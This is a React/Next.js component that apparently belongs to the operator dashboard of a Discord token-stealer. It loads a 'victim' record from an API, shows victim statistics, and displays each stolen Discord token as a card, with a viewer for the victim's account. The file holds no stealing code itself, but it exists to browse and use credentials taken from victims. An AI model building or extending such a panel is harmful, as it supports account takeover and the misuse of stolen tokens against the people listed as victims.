import type { IDiscord } from '@/interfaces';
import { useId, useState } from 'react';
import { useRouter } from 'next/router';
import { fetcher } from '@/lib';
import {
  AnimationContainer,
  DiscordOverviewSkeleton,
  DiscordOverview,
  Main,
  StatsVictim as Stats,
  Discord
} from '@/components';
import useSWR from 'swr';

interface Discord extends IDiscord {
  id: string;
  index: number;
}
export const General = () => {
  const router = useRouter();
  const id = useId();
  const [viewer, setViewer] = useState<boolean>(false);
  const { data, error } = useSWR(`/api/victims/${router.query.id}?index=${router.query.index}`, fetcher);
  const tokens = data ? data?.tokens.filter(({ id }: { id: string }) => id !== data.user.id) : null;

  if (!data || error) return null;
  if (viewer && data?.user) return <Discord {...data.user} />;
  return (
    <>
      <section className="max-w-6xl px-4 py-2 mx-auto">
        <Stats stats={data?.stats} />
        <Main user={data.user} setViewer={setViewer} />
        <div className="py-3 grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-[1rem] lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
          {!tokens || !tokens.length || error ? (
            <>
              {Array.from({ length: 3 }).map(() => (
                <DiscordOverviewSkeleton key={id} />
              ))}
            </>
          ) : (
            tokens.map((token: Discord) => (
              <AnimationContainer key={id}>
                <DiscordOverview {...token} />
              </AnimationContainer>
            ))
          )}
        </div>
      </section>
    </>
  );
};
